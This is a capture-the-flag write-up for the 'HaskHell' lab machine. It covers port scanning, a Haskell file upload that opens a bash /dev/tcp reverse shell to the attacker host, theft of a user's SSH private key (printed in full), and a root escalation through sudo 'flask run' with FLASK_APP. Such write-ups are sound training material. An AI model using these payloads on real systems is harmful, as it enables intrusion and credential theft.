![Congrats](assets/screenshots/HaskHell/HaskHell%20congrats.png)

# HaskHell - Complete CTF Writeup

**Machine Name:** HaskHell  
**Difficulty:** Medium  
**Objective:** Teach your CS professor that his PhD isn't in security.  
**Target IP:** 10.49.128.133  
**Attacker IP:** 10.49.134.52  

## Table of Contents
- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Initial Foothold (Haskell Reverse Shell)](#3-initial-foothold---haskell-reverse-shell)
- [4. Privilege Escalation to prof User](#4-privilege-escalation-to-prof-user)
- [5. Root Privilege Escalation](#5-root-privilege-escalation)
- [6. Flags](#6-flags)
- [Attack Chain Summary](#attack-chain-summary)

---

## 1. Reconnaissance

### Step 1.1: Quick Port Scan
```bash
sudo nmap -sS -p- -T4 --min-rate 5000 10.49.128.133 -oA haskhell_ports
```
**Results:**
```text
PORT     STATE SERVICE
22/tcp   open  ssh
5001/tcp open  http
```

### Step 1.2: Detailed Service Scan
```bash
nmap -sC -sV -p 22,5001 10.49.128.133
```
**Output:**
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
```

## 2. Web Enumeration

### Step 2.1: Gobuster Directory Scan
```bash
gobuster dir -u http://10.49.128.133:5001 -w /usr/share/wordlists/dirb/common.txt -x php,txt,py,sh -t 50
```
**Found:**
```text
/submit               (Status: 200) [Size: 237]
```

### Step 2.2: FFUF Extension Fuzzing
```bash
ffuf -u http://10.49.128.133:5001/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -t 100 -e .py,.txt,.bak,.old
```

### Step 2.3: Explore /homework1 Endpoint
```bash
curl http://10.49.128.133:5001/homework1
```
**Important Information Revealed:**
- Only Haskell files are accepted for uploads
- Files will be compiled and executed
- Output is piped to a file under the uploads directory
- Link to `/upload` (returns 404 - misconfigured)

### Step 2.4: Test /submit Endpoint
```bash
curl -X POST http://10.49.128.133:5001/submit -F "file=@test.hs"
```
**Response:** `302 Found` with redirect to `/uploads/test.hs`

## 3. Initial Foothold - Haskell Reverse Shell

### Step 3.1: Create Malicious Haskell File
```bash
cat > shell.hs << 'EOF'
module Main where
import System.Process

main :: IO ()
main = do
    system "bash -c 'bash -i >& /dev/tcp/10.49.134.52/4444 0>&1'"
    return ()
EOF
```

### Step 3.2: Start Netcat Listener (Terminal 1)
```bash
nc -lvnp 4444
```

### Step 3.3: Upload the Payload (Terminal 2)
```bash
curl -X POST http://10.49.128.133:5001/submit -F "file=@shell.hs"
```
**Server Response:**
```text
HTTP/1.1 302 FOUND
Location: http://10.49.128.133:5001/uploads/shell.hs
```

### Step 3.4: Trigger the Shell
```bash
curl http://10.49.128.133:5001/uploads/shell.hs
```

### Step 3.5: Reverse Shell Obtained
```bash
Listening on 0.0.0.0 4444
Connection received on 10.49.128.133 43176
bash: cannot set terminal process group (921): Inappropriate ioctl for device
bash: no job control in this shell
flask@haskhell:~$
```

### Step 3.6: Upgrade the Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 4. Privilege Escalation to prof User

### Step 4.1: Explore Home Directories
```bash
ls -la /home
```
**Output:**
```text
total 20
drwxr-xr-x 5 root    root    4096 May 27  2020 .
drwxr-xr-x 7 haskell haskell 4096 May 27  2020 haskell
drwxr-xr-x 7 prof    prof    4096 May 27  2020 prof
drwxr-xr-x 6 flask   flask   4096 May 27  2020 flask
```

### Step 4.2: Find prof's SSH Key
```bash
cat /home/prof/.ssh/id_rsa
```
**SSH Key Obtained (partial output):**
```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
... [full key content] ...
-----END RSA PRIVATE KEY-----
```

### Step 4.3: Save SSH Key on Attacker Machine (Terminal 3)
```bash
cat > prof_key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss
Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU
WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++
6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq
XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob
wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr
7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F
gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2
o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67
54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll
B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ
LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2
kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY
3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc
g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D
eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U
/cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j
BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc
ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S
/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF
yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw
MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt
i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA==
-----END RSA PRIVATE KEY-----
EOF

chmod 600 prof_key
```

### Step 4.4: Connect as prof via SSH
```bash
ssh -i prof_key prof@10.49.128.133
```
**Successful Connection:**
```text
Welcome to Ubuntu 18.04.4 LTS
prof@haskhell:~$
```

## 5. Root Privilege Escalation

### Step 5.1: Check Sudo Permissions
```bash
sudo -l
```
**Output:**
```text
User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

### Step 5.2: Create Malicious Python Script
```bash
echo 'import os; os.system("/bin/bash")' > /tmp/pwn.py
```

### Step 5.3: Set Flask Environment Variable
```bash
export FLASK_APP=/tmp/pwn.py
```

### Step 5.4: Execute Flask with Sudo
```bash
sudo /usr/bin/flask run
```

### Step 5.5: Root Shell Obtained
```bash
root@haskhell:~# whoami
root
```

## 6. Flags

### Step 6.1: Get User Flag
```bash
cat /home/prof/user.txt
```
**Result:**
![User Flag](assets/screenshots/HaskHell/HaskHell%20flag1.png)

### Step 6.2: Get Root Flag
```bash
cat /root/root.txt
```
**Result:**
![Root Flag](assets/screenshots/HaskHell/HaskHell%20flag%202.png)

---

## Attack Chain Summary
1. **Reconnaissance** - Nmap found ports 22 and 5001
2. **Enumeration** - Gobuster and FFUF found `/submit` endpoint
3. **Discovery** - `/homework1` revealed Haskell file upload requirement
4. **Payload Creation** - Built Haskell reverse shell
5. **Upload** - Submitted shell via `/submit`, received 302 redirect
6. **Trigger** - Accessed `/uploads/shell.hs` to execute
7. **Initial Shell** - Obtained reverse shell as flask user
8. **Lateral Movement** - Stole prof's SSH private key
9. **SSH Connection** - Connected as prof user
10. **Privilege Escalation** - Exploited sudo flask run with FLASK_APP
11. **Root Access** - Obtained root shell
12. **Flags Retrieved** - Both user and root flags captured

## Tools Used
| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| Gobuster | Directory brute forcing |
| FFUF | Web endpoint fuzzing |
| Netcat (nc) | Reverse shell listener |
| cURL | HTTP requests and file uploads |
| SSH | Secure shell connection |
| Python | PTY upgrade and privilege escalation |

## Lessons Learned
- Always enumerate thoroughly - hidden endpoints can provide access
- File upload functionality can be abused even with restricted file types
- Haskell code execution on server leads to RCE
- SSH private keys stored in home directories are valuable targets
- Sudo misconfigurations with environment variable control can lead to root compromise
- Different tools can achieve the same results as write-ups
